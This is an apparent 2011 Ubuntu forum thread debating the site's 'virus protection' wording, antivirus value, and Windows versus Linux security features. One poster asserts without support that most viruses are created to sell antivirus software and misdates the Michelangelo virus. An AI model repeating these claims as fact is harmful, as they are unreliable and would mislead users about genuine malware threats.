This is what I believe based on what I have seen in friends' uses and my own use of Windows, Mac, and Linux: [list][*]It is entirely possible to secure Windows, and so-called "antivirus" (what I like to call "placebo") software is not a part of that.[*]Windows does, however, not come with good security defaults. Windows 7 is better than XP, of course, but still not that great.[*]End users do not need to know all the technical terminology with regard to malware, but they should understand conceptually that some kinds of infections happen automatically and with minimal user intervention, and others rely solely on the user being dumb. The latter kind of attack should never happen, and scaring people into installing "antivirus" is just about the worst way to deal with it.[*]Software vulnerabilities are discovered all the time on all three major platforms (Mac, Windows, Linux), and they are also patched all the time. Most computer users I know, though, do not install system updates regularly. What's the point of Apple, Microsoft, or Ubuntu releasing patches if people aren't installing those patches?[/list] > **tgm4883 said:**
> 
I disagree, what virus protection does Ubuntu offer? If you are married and don't cheat does that mean you have Aids protection? In terms of what makes Windows more insecure or more vulnerable to threats--as I said before, Windows can be secured, but it isn't easy to do. [list][*]Windows relies on a terrible method of software distribution. If you want an application, apart from buying the CD/DVD (which is possible for only a select few commercial applications people want), the standard method is searching the internet randomly for a setup.exe file. Ubuntu, like many other Linux distributions, has software channels for distributing most software, which means there's far less of a need, especially for non-power-users to stray to random searching of the internet for .deb files. Apple is also moving toward this model for Mac OS X with the release of the Mac App Store for Snow Leopard.[*]In my experience using Windows 2000, XP, and 7, if you set Windows to install updates "automatically," you still have to install them manually yourself. I can't be the only one who's experienced this. Otherwise, how else could the Conficker worm have spread to so many millions of computers? Microsoft patched that vulnerability at least a month beforehand.[*]Too many autorun "features" in Windows by default.[*]The UAC implementation in Windows is annoying. I know, because I use it every day at work. I use it because I know it is better than turning it off, from a security standpoint. But I know many Windows users who turn it off altogether, which means they're essentially running as root all the time. The authentication dialogues in Mac and Ubuntu are far less annoying so far less likely to be turned off. Plus, turning off the Ubuntu prompt involves editing the /etc/sudoers file, which is a bit more involved than turning off UAC with a few clicks.[*]Ubuntu, like a lot of Linux distros, has a generally "everything is a file" approach to the filesystem hierarchy, which means that if something gets infected, it's far easier to just boot up a live CD and load up the proper instance of the file than combing through various registry entries and trying to clean up the damage a Windows virus. Similarly, Ubuntu users can reinstall Ubuntu within 20 minutes. I've done many a Windows installation and it's never that quick. That means Windows users who have an infection are far more likely to just keep the infected computer as is.[/list] There's probably more but I'm tired and that's all I can think of right now.

---

### Post by Hyporeal on 2011-04-30
> **tgm4883 said:**
> Ineffectual? Explain.

Not useful or effective. Security theater.

> There is nothing in Linux file system permissions that give you more security over other properly administered OS's, and there is nothing in file system permissions that would prevent a virus from running and....

No virus protection is perfect. By omission you acknowledge that file system permissions do afford some protection. The fact that other operating systems have security measures is irrelevant.

> The "virus protection" bit is just a vague marketing statement for the lay person. Nevertheless, nothing is hidden. Anyone who is serious about security can access information about the full range of protections afforded by Ubuntu. This is an issue because the lay person will think they are protected from threats, and not look any deeper into security.

Thanks for kinda making my point for me :D

You added the last bit, which you state without any evidence or thoughtful reasoning. In fact, it is nonsense. I challenge you to name a single person who would have delved into technical security information if not for that one clause about "virus protection". If anything, an obviously vague statement like that would cause people to dig deeper. I cite this thread as evidence.

---

### Post by tgm4883 on 2011-04-30
> **Hyporeal said:**
> Not useful or effective. Security theater.


You have nothing to back that up, but it's your opinion and you are entitled to that.

> **Hyporeal said:**
> 
No virus protection is perfect. By omission you acknowledge that file system permissions do afford some protection. The fact that other operating systems have security measures is irrelevant.


Thanks for not quoting any of my other points, it's not like I put any work into coming up with them. Oh and thanks again for giving me my rebuttal. 

By omission, you acknowledge that file system permissions provide zero protection against threats. They do offer protection against a something changing files that it doesn't have access to, but file system permissions don't actually stop a threat from running (something that AV software could do). A threat running as the user and only having access to user files is just as bad as a threat having root access, in most environments.

> **Hyporeal said:**
> 
You added the last bit, which you state without any evidence or thoughtful reasoning. In fact, it is nonsense. I challenge you to name a single person who would have delved into technical security information if not for that one clause about "virus protection". If anything, an obviously vague statement like that would cause people to dig deeper. I cite this thread as evidence.

Yea I know I added the last bit, I did it that way on purpose. I thought that was fairly obvious to everyone as I quoted you right before that.

I suppose the bit I added is nonsense because you say it is? 

I ask you, where is the lay person in this thread? This thread is full of people that know what they are talking about, even though we have different opinions on the subject. There is no lay person here my friend. Nobody is here because they are digging deeper, we are here because we disagree with the statement.

---

### Post by tgm4883 on 2011-04-30
> **aysiu said:**
> Okay. But I never said Linux is invincible. I'm just looking at it from a practical standpoint and trying to get people to see a reasonable middle ground. The two extremes I see (and this is both in Windows v. Mac discussions and Windows v. Linux discussions) are 1) Mac/Linux is invicible and 2) Mac/Linux is just as vulnerable to attacks as Windows.

Or, worse yet, 3) Because there is any kind of malware (usually a trojan) on Mac/Linux, that means people should install "antivirus" software.

This is what I believe based on what I have seen in friends' uses and my own use of Windows, Mac, and Linux: [list][*]It is entirely possible to secure Windows, and so-called "antivirus" (what I like to call "placebo") software is not a part of that.[*]Windows does, however, not come with good security defaults. Windows 7 is better than XP, of course, but still not that great.[*]End users do not need to know all the technical terminology with regard to malware, but they should understand conceptually that some kinds of infections happen automatically and with minimal user intervention, and others rely solely on the user being dumb. The latter kind of attack should never happen, and scaring people into installing "antivirus" is just about the worst way to deal with it.[*]Software vulnerabilities are discovered all the time on all three major platforms (Mac, Windows, Linux), and they are also patched all the time. Most computer users I know, though, do not install system updates regularly. What's the point of Apple, Microsoft, or Ubuntu releasing patches if people aren't installing those patches?[/list]  In terms of what makes Windows more insecure or more vulnerable to threats--as I said before, Windows can be secured, but it isn't easy to do. [list][*]Windows relies on a terrible method of software distribution. If you want an application, apart from buying the CD/DVD (which is possible for only a select few commercial applications people want), the standard method is searching the internet randomly for a setup.exe file. Ubuntu, like many other Linux distributions, has software channels for distributing most software, which means there's far less of a need, especially for non-power-users to stray to random searching of the internet for .deb files. Apple is also moving toward this model for Mac OS X with the release of the Mac App Store for Snow Leopard.[*]In my experience using Windows 2000, XP, and 7, if you set Windows to install updates "automatically," you still have to install them manually yourself. I can't be the only one who's experienced this. Otherwise, how else could the Conficker worm have spread to so many millions of computers? Microsoft patched that vulnerability at least a month beforehand.[*]Too many autorun "features" in Windows by default.[*]The UAC implementation in Windows is annoying. I know, because I use it every day at work. I use it because I know it is better than turning it off, from a security standpoint. But I know many Windows users who turn it off altogether, which means they're essentially running as root all the time. The authentication dialogues in Mac and Ubuntu are far less annoying so far less likely to be turned off. Plus, turning off the Ubuntu prompt involves editing the /etc/sudoers file, which is a bit more involved than turning off UAC with a few clicks.[*]Ubuntu, like a lot of Linux distros, has a generally "everything is a file" approach to the filesystem hierarchy, which means that if something gets infected, it's far easier to just boot up a live CD and load up the proper instance of the file than combing through various registry entries and trying to clean up the damage a Windows virus. Similarly, Ubuntu users can reinstall Ubuntu within 20 minutes. I've done many a Windows installation and it's never that quick. That means Windows users who have an infection are far more likely to just keep the infected computer as is.[/list] There's probably more but I'm tired and that's all I can think of right now.

Aysiu, I'm honestly not sure what you and I are discussing anymore. It feels like we've gotten a bit off topic (the wording on the page). We both agree that security practices are important. We disagree on the usefulness of Antivirus software. And while we agree on the distinction between virus and trojan, we disagree on what the lay person cares about.

Are Linux desktop's more secure than Windows desktop's? I think so. But Windows security has come a long way and the weakest point in the security chain is still the lay person.

---

### Post by Telengard C64 on 2011-04-30
> **tgm4883 said:**
> Aysiu, I'm honestly not sure what you and I are discussing anymore.

To be fair, Aysiu admitted to being tired. A tired brain does tend to meander about   :P

> It feels like we've gotten a bit off topic (the wording on the page).

Agreed. This is not and should not become a *Windows v. Ubuntu* thread. Not by a long shot.

I'm sure I don't need to remind everyone here that a **virus** (exact word used in the quoted/disputed paragraph) is a specific kind of security problem. It may work hand in hand with other kinds of security problems, such as application exploits or trojans or rootkits, but the virus itself is still a definable thing.

Most people in this thread seem to agree that Ubuntu does include specific features which inhibit virus-like behaviors. Sadly, the disputed paragraph leaves open to debate the meaning of the phrase **virus protection**. I could be wrong about this, but I'm pretty sure most lay-people reading the paragraph will conclude that Ubuntu includes anti-virus software.

---

### Post by aysiu on 2011-04-30
> **tgm4883 said:**
> the weakest point in the security chain is still the lay person. Yes. Let's leave it at that.

---

### Post by wizard10000 on 2011-04-30
> **tomazzi said:**
> Just one example: in NTFS "executable" and "readable" permissions cannot be splitted while in *nixes in every existing filesystem this is possible. This trivial difference allows to override many limits set it group policy and You need 3-rd party (paid) software to add some security functions.

Sorry, that's not correct.

NTFS permissions:

Read Data
Read Attributes
Read Extended Attributes
Execute File
Traverse Folder
Create Files/Write Data
Create Folders/Append Data
Write Attributes
Write Extended Attributes
Delete
Delete Subfolders and Files
Read Permissions
Change Permissions
Take Ownership
Synchronize

---

### Post by Timmer1240 on 2011-04-30
[http://www.bitdefender.com/business/antivirus-for-unices.html](http://www.bitdefender.com/business/antivirus-for-unices.html) you can get a free for home use licence for bitdefender if anyones interested

---

### Post by Timmer1240 on 2011-04-30
I tryed it out and it found some stuff in my browser cache nothing that wouldve effected me but probably a windows machine

---

### Post by disabledaccount on 2011-05-01
> **wizard10000 said:**
> Sorry, that's not correct.

NTFS permissions:

Read Data
Read Attributes
Read Extended Attributes
Execute File
Traverse Folder
Create Files/Write Data
Create Folders/Append Data
Write Attributes
Write Extended Attributes
Delete
Delete Subfolders and Files
Read Permissions
Change Permissions
Take Ownership
SynchronizeOh really? Your source gives wrong informations. Unles You provide real examples of how to prevent executing of unknown code, it can be treated as a advertisement only. And beware - I know windows and I know what I'm talking about - so be good or don't waste the server storage space.

It's very easy to bypass Windows group policy in most cases - thats why mobile apps exist. And because of that, it's relatively easy to get admin rights in many situations (eg. by forcing default system config to be used or by using konbot) - and beacuse windows don't  create detail logs, then You won't get even a trace of the way that the system have been broken.

---

### Post by wizard10000 on 2011-05-01
> **tomazzi said:**
> Oh really? Your source gives wrong informations. Unles You provide real examples of how to prevent executing of unknown code, it can be treated as a advertisement only.

[chuckle]

Here's what you said:

> Just one example: in NTFS "executable" and "readable" permissions cannot be splitted while in *nixes in every existing filesystem this is possible.

That my friend, is incorrect.

> And beware - I know windows and I know what I'm talking about - so be good or don't waste the server storage space.

[chuckle again]

This just gets better all the time  :D

Enough pig wrestling.  You may have the last word.

cheers -

---

### Post by screaminj3sus on 2011-05-01
> **oldsoundguy said:**
> Wrong!! To put any malware into your KERNEL requires root privileges.  Unless you are dumber than a ditch, not happening .. especially Ubuntu that really makes getting into root a real task.

People need to stop acting like it would be so hard to compromise ubuntu. Most prevalent windows viruses these days are rogue antimalware programs that use social engineering to install themselves. This could easily happen to linux as well if it had a userbase as big as windows. All it takes is "YOU HAVE 1000 INFECTIONS, ENTER YOUR PASSWORD TO SCAN". Of course the vast majority of current *nix users wouldn't fall for that in million years, but windows has tons of novice, computer illiterate users.

Also windows has UAC since windows vista, it doesn't prompt for your password like linux but its the same principle.

The main problem is users, you can't fix stupid.

---

### Post by wizard10000 on 2011-05-01
> **screaminj3sus said:**
> ...The main problem is users, you can't fix stupid.

Supporting users is how I've made my living for the last fifteen years or so.  My current gig is heading up desktop support for a 3,300 user federal agency.  I'm all for educating users but if we make them *too* smart we're gonna have to lay some people off  ;)

---

### Post by disabledaccount on 2011-05-01
> **wizard10000 said:**
> Enough pig wrestling.  You may have the last word.Yeah, that's the response I've expected - when it comes to details then it's best to use slogans.

I suppose that 99% of users don't care about that - so AVs will keep having huge market share, because stupid sheeps will buy it. Maybe one thing is worth to say at end: most of viruses are created to sell AV software and many of viruses are harmless pieces of code that exist only to be "detected". Linux puts the danger for huge companies because of beeing invulnerable to most of viruses - milions of dollars in income can be "lost" if peoples will switch to Linux - so it's very important to keep poeoples thinking of constant, unavoidable threat from viruses.

Remember "michael angelo" from year 2000? - it was the biggest swindle in the AV history.

---

### Post by el_koraco on 2011-05-01
Educating users is listed as one of the six dumbest idea of computer security by dr. Ranum: 

[http://www.ranum.com/security/computer_security/editorials/dumb/]("http://www.ranum.com/security/computer_security/editorials/dumb/")

---

### Post by tgm4883 on 2011-05-01
> **tomazzi said:**
> Oh really? Your source gives wrong informations. Unles You provide real examples of how to prevent executing of unknown code, it can be treated as a advertisement only. And beware - I know windows and I know what I'm talking about - so be good or don't waste the server storage space.

It's very easy to bypass Windows group policy in most cases - thats why mobile apps exist. And because of that, it's relatively easy to get admin rights in many situations (eg. by forcing default system config to be used or by using konbot) - and beacuse windows don't  create detail logs, then You won't get even a trace of the way that the system have been broken.

Please let me know how I can prevent the executing of unknown code.

---

### Post by pi3.1415926535... on 2011-05-01
> **el_koraco said:**
> Educating users is listed as one of the six dumbest idea of computer security by dr. Ranum: 

[http://www.ranum.com/security/computer_security/editorials/dumb/]("http://www.ranum.com/security/computer_security/editorials/dumb/")

I also find interesting the part that states that companies need to stop promoting "hackers" by hiring them to test systems, saying that hacking must not be made "cool". First off, hiring people who know what they are doing, is both reducing the systems risk, and minimizing the number of people attempting to **crack** the system. Secondly, hacking is cool. Linux was built by hackers. Cracking on the other hand is not as cool.

---

### Post by el_koraco on 2011-05-01
> **pi3.1415926535... said:**
> I also find interesting the part that states that companies need to stop promoting "hackers" by hiring them to test systems, saying that hacking must not be made "cool". First off, hiring people who know what they are doing, is both reducing the systems risk, and minimizing the number of people attempting to **crack** the system. Secondly, hacking is cool. Linux was built by hackers. Cracking on the other hand is not as cool.

He was writing it for Windows people mostly. And I think his hacking is cool is wrong idea is more like part of his general philosophy. You can't take it out of context. But you're welcome to have the discussion with him :D

---

### Post by disabledaccount on 2011-05-01
> **tgm4883 said:**
> Please let me know how I can prevent the executing of unknown code.
This question is a trap :)
I can either write answer that won't fit 10 pages or write it shortly, but then another 10 pages of discussion will appear.
But, I can try to provide some overview of what can be done, from admin point of view:
Windows:
generally, user has no protection from system side, so he has to belive in AV skills. But AV is secondary protection - first thing is to lock the BIOS with the password and disable booting from USB, CD/ other devices. Admin or power user can still change boot sequence, but it's impossible to accidently boot from USB stick leaved in socket while rebooting after eg. BSOD :)
Choose AV software that is configurable - if AV claims to be "smart" and don't provide full control of what it is doing, then it's a ****. One of good examples is/(was) comodo AV - it was confgurable to every last bit in action - then it was enough to port profiles to other installed instances and keep things working as expected. (But configuration process was very hard and needed a lot of time). To huge degree Comodo was replication of apparmor in terms of functionality.
Group policy on windows is so easy to bypass, that I woudn't even try it without additional logging/AV software - so if using such, at least You will know who and in what way killed Your network/system. Best practice is to define list of allowed applications - but this can be easily overrided by simply changing name of executable file - so next level of protection is to compare runtime images - there are several utilities than can be hooked.
This of course wont protect You against IE8 memory management holes, but this is very long part to discuss or very simple solution to apply: use safe and compatible Web Browser (IE8 is not safe nor compatible, however it's less shitty than IE7 and earlier versions)
Linux: in most cases it's sufficient to not allow the user to chmod/chown - then he can only run the apps installed by admin.

---

### Post by tgm4883 on 2011-05-01
> **tomazzi said:**
> This question is a trap :)
I can either write answer that won't fit 10 pages or write it shortly, but then another 10 pages of discussion will appear.
But, I can try to provide some overview of what can be done, from admin point of view:
Windows:
generally, user has no protection from system side, so he has to belive in AV skills. But AV is secondary protection - first thing is to lock the BIOS with the password and disable booting from USB, CD/ other devices. Admin or power user can still change boot sequence, but it's impossible to accidently boot from USB stick leaved in socket while rebooting after eg. BSOD :)
Choose AV software that is configurable - if AV claims to be "smart" and don't provide full control of what it is doing, then it's a ****. One of good examples is/(was) comodo AV - it was confgurable to every last bit in action - then it was enough to port profiles to other installed instances and keep things working as expected. (But configuration process was very hard and needed a lot of time). To huge degree Comodo was replication of apparmor in terms of functionality.
Group policy on windows is so easy to bypass, that I woudn't even try it without additional logging/AV software - so if using such, at least You will know who and in what way killed Your network/system. Best practice is to define list of allowed applications - but this can be easily overrided by simply changing name of executable file - so next level of protection is to compare runtime images - there are several utilities than can be hooked.
This of course wont protect You against IE8 memory management holes, but this is very long part to discuss or very simple solution to apply: use safe and compatible Web Browser (IE8 is not safe nor compatible, however it's less shitty than IE7 and earlier versions)
Linux: in most cases it's sufficient to not allow the user to chmod/chown - then he can only run the apps installed by admin.

In Linux, limiting chmod and chown doesn't prevent me from running code.

---

### Post by Telengard C64 on 2011-05-01
> **el_koraco said:**
> [http://www.ranum.com/security/computer_security/editorials/dumb/]("http://www.ranum.com/security/computer_security/editorials/dumb/")

The article suggests that *default allow* is a bad security model. AppArmor is a default allow security model. If there isn't an AppArmor profile for *virus.sh*, then it runs unrestricted by AppArmor.

---

### Post by Telengard C64 on 2011-05-01
> **tgm4883 said:**
> Please let me know how I can prevent the executing of unknown code.

I also want to know how to prevent executing of unknown code.

---

### Post by tgm4883 on 2011-05-01
> **Telengard C64 said:**
> The article suggests that *default allow* is a bad security model. AppArmor is a default allow security model. If there isn't an AppArmor profile for *virius.sh*, then it runs unrestricted by AppArmor.

IIRC this is due to the way Ubuntu has implemented AppArmor. I believe you can configure AppArmor to default deny which would restrict applications that have no profiles (or maybe it was a default profile that would restrict access if a specific profile didn't exist)

---

### Post by el_koraco on 2011-05-02
> **Telengard C64 said:**
> The article suggests that *default allow* is a bad security model. AppArmor is a default allow security model. If there isn't an AppArmor profile for *virus.sh*, then it runs unrestricted by AppArmor.

I think that's a matter of setting it up. Sahib Ranum was talking about high grade firewalls, but the logic could very easily be applied to you regular home box.

---

### Post by mark1.0 on 2011-07-05
Wow, I was just reading some of the posts here.  I am new to Ubuntu and consider myself a lay person. I don't consider myself an idiot.

Reading how some of you "experts" regard people like me, really puts a damper on why I switched to Ubuntu in the first place.

It appears some of you need to forget about software and look in the mirror.

If you are typical Ubuntu/Linux users, which I hope you are not, I'll be going elsewhere for an OS.

In it for a dishonest buck or to feel superior to others, it appears to me.

good luck with that........

---

### Post by slooksterpsv on 2011-07-05
> **mark1.0 said:**
> Wow, I was just reading some of the posts here.  I am new to Ubuntu and consider myself a lay person. I don't consider myself an idiot.

Reading how some of you "experts" regard people like me, really puts a damper on why I switched to Ubuntu in the first place.

It appears some of you need to forget about software and look in the mirror.

If you are typical Ubuntu/Linux users, which I hope you are not, I'll be going elsewhere for an OS.

In it for a dishonest buck or to feel superior to others, it appears to me.

good luck with that........

I haven't read all of the posts, but I have a feeling I know what you're getting at.

It's not that we regard people as idiots, it's more of they're ignorant, for a better term, in the state of being secure on the internet. Some people just need a bit more education on these items and not try to jump in it all at once. --EDIT Lost track of what I was saying there (headache) so I removed it as it wasn't aa complete thought either. --

Overall, I feel if users were to understand the risks they face on the internet, and try to secure themselves a bit better instead of - well it looks legit, it must be - theory; they'd be better off. Or at least research something if you're unsure.

If I have that completely wrong, ignore it.

Let's just say this, Ubuntu maybe has 1-2 viruses out there, but it would have to be something you downloaded and installed not from the repos, where someone had malicious intent. Why they say it has Virus Protection on the Ubuntu page, someone fubar'ed that. 

Finally, welcome to the forums, if you need anything let us know. I hope you enjoy Ubuntu and find that suits your needs.

---

